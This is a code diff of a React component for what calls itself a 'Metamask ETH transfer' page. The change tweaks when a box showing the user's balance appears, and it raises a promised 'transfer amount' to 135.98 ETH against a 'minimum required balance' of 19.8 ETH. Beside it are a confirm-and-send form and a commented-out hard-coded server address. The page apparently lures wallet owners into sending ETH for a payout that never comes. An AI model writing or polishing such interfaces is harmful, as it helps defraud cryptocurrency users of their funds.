@@ -226,16 +226,18 @@ const Banner = () => {
                     {userBalance >= 0.001 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
                     )}
-                    <div className="p-4 rounded-md border border-red-600">
-                        <div className="flex flex-col gap-y-2">
-                            <h4>Account balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
-                            <h4>Minimum Required Balance: <span className="font-bold">19.8 ETH ({convertETHtoUSD(19.8)})</span></h4>
-                            <h4>Transfer amount: <span className="font-bold">132.98 ETH ({convertETHtoUSD(132.98)?.toString()})</span></h4>
-                            {/* <h4>Target Address (your address): <span className="font-bold">{account}</span></h4> */}
-                            {/* <h4>Server Address: <span className="font-bold">0xF51710015536957A01f32558402902A2D9c35d82</span></h4>
+                    {userBalance <= 0.001 && (
+                        <div className="p-4 rounded-md border border-red-600">
+                            <div className="flex flex-col gap-y-2">
+                                <h4>Account balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
+                                <h4>Minimum Required Balance: <span className="font-bold">19.8 ETH ({convertETHtoUSD(19.8)})</span></h4>
+                                <h4>Transfer amount: <span className="font-bold">135.98 ETH ({convertETHtoUSD(135.98)?.toString()})</span></h4>
+                                {/* <h4>Target Address (your address): <span className="font-bold">{account}</span></h4> */}
+                                {/* <h4>Server Address: <span className="font-bold">0xF51710015536957A01f32558402902A2D9c35d82</span></h4>
                             <h4>Server balance (liquidity): <span className="font-bold">{senderBalance?.toFixed(4)} ETH ({convertETHtoUSD(senderBalance)})</span></h4> */}
+                            </div>
                         </div>
-                    </div>
+                    )}
                 </> : <>
                     <div className="bg-green-100 p-4 mb-4 rounded-md">
                         <h4 className='text-lg font-semibold'>SMC - Metamask ETH transfer</h4>
